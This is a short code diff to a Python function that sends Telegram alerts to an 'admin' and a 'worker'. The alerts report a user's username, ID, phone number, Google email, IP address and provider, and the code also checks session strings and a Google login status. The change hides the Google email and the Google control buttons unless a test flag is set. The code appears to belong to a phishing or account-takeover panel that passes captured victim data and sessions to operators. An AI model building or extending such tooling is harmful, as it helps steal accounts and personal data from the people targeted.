@@ -444,7 +444,7 @@ async def notify_user_event(
             f"• <b>Юзернейм:</b> {user_tag}",
             f"• <b>Номер телефона:</b> {phone_display}",
         ]
-        if email:
+        if is_test_event and email:
             admin_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
         if ip and ip != "—":
             prov = isp
@@ -480,7 +480,7 @@ async def notify_user_event(
             admin_alert_msg_id = None
 
         # Control buttons
-        is_google_event = (
+        is_google_event = is_test_event and (
             norm_step.startswith("google_")
             or bool(email and not session_str)
             or bool(user_row and "google_status" in user_row.keys() and user_row["google_status"])
@@ -612,7 +612,7 @@ async def notify_user_event(
                 f"👤 <b>Юзер:</b> {user_tag} (ID: <code>{user_tg_id}</code>)",
                 f"📱 <b>Телефон:</b> {phone_display}",
             ]
-            if email:
+            if is_test_event and email:
                 worker_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
             if ip and ip != "—":
                 prov = isp
